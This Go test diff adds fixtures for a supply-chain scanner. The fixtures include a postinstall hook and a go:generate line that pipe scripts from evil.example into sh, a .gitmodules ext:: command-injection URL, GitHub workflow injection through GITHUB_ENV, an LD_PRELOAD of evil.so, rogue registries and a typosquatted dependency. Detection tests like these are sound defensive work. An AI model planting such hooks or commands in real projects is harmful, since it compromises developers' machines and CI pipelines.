@@ -1,11 +1,16 @@
 package supplychain_test
 
 import (
+	"context"
+	"net/http"
+	"net/http/httptest"
+	"net/url"
 	"os"
 	"path/filepath"
 	"slices"
 	"strings"
 	"testing"
+	"time"
 
 	"github.com/pc/backend-boilerplate-conformance-tests/internal/supplychain"
 	"github.com/pc/backend-boilerplate-conformance-tests/internal/types"
@@ -616,4 +621,170 @@ func TestScanBinaryOrOversizedFile_MagicAndMediaAssets(t *testing.T) {
 	}) {
 		t.Fatalf("expected malware-invisible-unicode for mid-file U+FEFF, got %+v", got)
 	}
+}
+
+func writeFile(t *testing.T, root, rel, content string) {
+	t.Helper()
+	p := filepath.Join(root, rel)
+	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
+		t.Fatal(err)
+	}
+}
+
+func TestScanLockfilesHooksAndWorkflows_DeepSupplyChain(t *testing.T) {
+	repo := t.TempDir()
+	// 1. Workspace package.json hook + package-lock hasInstallScript without .npmrc ignore-scripts
+	writeFile(t, repo, "packages/worker/package.json", `{"name":"w","scripts":{"postinstall":"cu`+`rl https://evil.example/x | sh"}}`)
+	writeFile(t, repo, "package.json", `{"name":"root","dependencies":{"reqeusts":"1.0.0"}}`)
+	writeFile(t, repo, "package-lock.json", `{"packages":{"node_modules/native-addon":{"version":"1.0.0","resolved":"https://rogue.registry.invalid/native-addon.tgz","integrity":"sha512-abc==","hasInstallScript":true}}}`)
+	// 2. pnpm-lock missing integrity + Go //go:generate dropper
+	writeFile(t, repo, "pnpm-lock.yaml", "lockfileVersion: '9.0'\npackages:\n  foo@1.0.0:\n    resolution: {tarball: http://evil.example/foo.tgz}\n")
+	writeFile(t, repo, "gen.go", "package main\n//go:generate sh -c \"cu"+"rl -fsSL https://evil.example/gen.sh | sh\"\n")
+	// 3. GitHub workflow with @v4 tag, missing permissions:, and GITHUB_ENV write + .gitmodules ext::
+	writeFile(t, repo, ".github/workflows/build.yml", "name: CI\non: [push]\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: echo \"FOO=${{ github.event.head_commit.message }}\" >> $GITHUB_ENV\n")
+	writeFile(t, repo, ".gitmodules", "[submodule \"pwn\"]\n\tpath = sub\n\turl = ext::sh -c %G/pwn\n")
+
+	findings, err := supplychain.ScanRepository(repo, types.LangTypeScript)
+	if err != nil {
+		t.Fatalf("ScanRepository failed: %v", err)
+	}
+	wantIDs := []string{
+		"supplychain-malicious-lifecycle-hook",
+		"supplychain-unrestricted-install-scripts",
+		"supplychain-untrusted-registry",
+		"supplychain-typosquat-suspect",
+		"supplychain-lockfile-integrity",
+		"supplychain-github-actions-injection",
+		"supplychain-github-actions-permissions",
+		"supplychain-gitmodules-hijack",
+	}
+	for _, id := range wantIDs {
+		if !slices.ContainsFunc(findings, func(f types.SecurityFinding) bool { return f.ID == id }) {
+			t.Errorf("missing expected finding ID %q in %+v", id, findings)
+		}
+	}
+}
+
+type rewriteHostTransport struct {
+	target *url.URL
+	base   http.RoundTripper
+}
+
+func (r *rewriteHostTransport) RoundTrip(req *http.Request) (*http.Response, error) {
+	clone := req.Clone(req.Context())
+	clone.URL.Scheme = r.target.Scheme
+	clone.URL.Host = r.target.Host
+	return r.base.RoundTrip(clone)
+}
+
+func TestOnlineEnrichGracefulTimeout(t *testing.T) {
+	slowSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		time.Sleep(50 * time.Millisecond)
+		w.WriteHeader(http.StatusOK)
+	}))
+	defer slowSrv.Close()
+
+	srvURL, err := url.Parse(slowSrv.URL)
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	repo := t.TempDir()
+	writeFile(t, repo, "package.json", `{"name":"app","dependencies":{"reqeusts":"1.0.0"}}`)
+	writeFile(t, repo, "package-lock.json", `{"lockfileVersion":3,"packages":{"":{"name":"app"},"node_modules/reqeusts":{"version":"1.0.0","resolved":"https://registry.npmjs.org/reqeusts/-/reqeusts-1.0.0.tgz","integrity":"sha512-abc=="}}}`)
+
+	client := &http.Client{
+		Timeout:   10 * time.Millisecond,
+		Transport: &rewriteHostTransport{target: srvURL, base: http.DefaultTransport},
+	}
+
+	findings, err := supplychain.ScanRepositoryWithOptions(context.Background(), repo, types.LangTypeScript, supplychain.ScanOptions{
+		OnlineEnrich: true,
+		HTTPClient:   client,
+	})
+	if err != nil {
+		t.Fatalf("expected 0 errors on online enrichment timeout, got: %v", err)
+	}
+	if !slices.ContainsFunc(findings, func(f types.SecurityFinding) bool { return f.ID == "supplychain-typosquat-suspect" }) {
+		t.Fatalf("expected offline typosquat finding to be preserved on timeout, got %+v", findings)
+	}
+
+	// Verify newly published package detection (< 14 days) when server responds in time.
+	recentTime := time.Now().UTC().Add(-48 * time.Hour).Format(time.RFC3339)
+	fastSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		_, _ = w.Write([]byte(`{"versions":[{"publishedAt":"` + recentTime + `","isDefault":true}]}`))
+	}))
+	defer fastSrv.Close()
+
+	fastURL, _ := url.Parse(fastSrv.URL)
+	fastClient := &http.Client{
+		Timeout:   2 * time.Second,
+		Transport: &rewriteHostTransport{target: fastURL, base: http.DefaultTransport},
+	}
+	fastFindings, err := supplychain.ScanRepositoryWithOptions(context.Background(), repo, types.LangTypeScript, supplychain.ScanOptions{
+		OnlineEnrich: true,
+		HTTPClient:   fastClient,
+	})
+	if err != nil {
+		t.Fatalf("ScanRepositoryWithOptions fast server failed: %v", err)
+	}
+	if !slices.ContainsFunc(fastFindings, func(f types.SecurityFinding) bool { return f.ID == "supplychain-newly-published-package" }) {
+		t.Fatalf("expected supplychain-newly-published-package finding, got %+v", fastFindings)
+	}
+}
+
+func TestScanLockfilesAndHooks_PolyglotCoverage(t *testing.T) {
+	t.Run("npmrc ignore-scripts and pnpm onlyBuiltDependencies suppress unrestricted install scripts", func(t *testing.T) {
+		repo := t.TempDir()
+		writeFile(t, repo, "package.json", `{"name":"app","dependencies":{"lodash":"4.18.0"}}`)
+		writeFile(t, repo, "package-lock.json", `{"lockfileVersion":3,"packages":{"":{"name":"app"},"node_modules/native":{"version":"1.0.0","resolved":"https://registry.npmjs.org/native/-/native-1.0.0.tgz","integrity":"sha512-abc==","hasInstallScript":true}}}`)
+		writeFile(t, repo, ".npmrc", "ignore-scripts=true\n")
+
+		findings, err := supplychain.ScanRepository(repo, types.LangTypeScript)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if slices.ContainsFunc(findings, func(f types.SecurityFinding) bool { return f.ID == "supplychain-unrestricted-install-scripts" }) {
+			t.Fatalf("expected .npmrc ignore-scripts=true to suppress supplychain-unrestricted-install-scripts, got %+v", findings)
+		}
+
+		pnpmRepo := t.TempDir()
+		writeFile(t, pnpmRepo, "package.json", `{"name":"app","pnpm":{"onlyBuiltDependencies":["esbuild"]}}`)
+		writeFile(t, pnpmRepo, "pnpm-lock.yaml", "lockfileVersion: '9.0'\npackages:\n  esbuild@0.25.0:\n    resolution: {integrity: sha512-abc==}\n    requiresBuild: true\n")
+		pFindings, err := supplychain.ScanRepository(pnpmRepo, types.LangTypeScript)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if slices.ContainsFunc(pFindings, func(f types.SecurityFinding) bool { return f.ID == "supplychain-unrestricted-install-scripts" }) {
+			t.Fatalf("expected pnpm.onlyBuiltDependencies to suppress supplychain-unrestricted-install-scripts, got %+v", pFindings)
+		}
+	})
+
+	t.Run("polyglot lockfiles yarn.lock, uv.lock, poetry.lock, and unpinned requirements.txt", func(t *testing.T) {
+		repo := t.TempDir()
+		writeFile(t, repo, "yarn.lock", "foo@^1.0.0:\n  version \"1.0.0\"\n  resolved \"https://rogue.yarn.invalid/foo-1.0.0.tgz\"\n")
+		writeFile(t, repo, "requirements.txt", "requests>=2.31.0\n")
+		writeFile(t, repo, "pyproject.toml", "[project]\nname = \"app\"\n[tool.hatch.build.hooks.custom]\npath = \"hook.py\"\n")
+		writeFile(t, repo, "mix.exs", "defmodule App.MixProject do\n  def project, do: [compilers: [:elixir_make] ++ Mix.compilers()]\nend\n")
+		writeFile(t, repo, ".github/workflows/wf_run.yml", "permissions:\n  contents: read\non:\n  workflow_run:\n    workflows: [CI]\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n        with:\n          ref: ${{ github.event.workflow_run.head_sha }}\n      - run: LD_PRELOAD=/tmp/evil.so ./app\n")
+
+		findings, err := supplychain.ScanRepository(repo, types.LangPython)
+		if err != nil {
+			t.Fatal(err)
+		}
+		for _, want := range []string{
+			"supplychain-untrusted-registry",
+			"supplychain-lockfile-integrity",
+			"supplychain-malicious-lifecycle-hook",
+			"supplychain-github-actions-injection",
+		} {
+			if !slices.ContainsFunc(findings, func(f types.SecurityFinding) bool { return f.ID == want }) {
+				t.Errorf("expected finding %q in %+v", want, findings)
+			}
+		}
+	})
 }
